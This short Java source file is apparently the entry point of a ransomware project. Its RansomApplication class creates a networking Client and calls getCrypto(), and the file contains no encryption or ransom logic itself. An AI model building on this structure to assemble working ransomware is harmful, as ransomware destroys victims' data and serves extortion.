package Agent;

import Agent.networking.Client;

public class RansomApplication {

	public static void main(String[] args) throws Exception {
		Client cl=new Client();
		cl.getCrypto();
	}

}
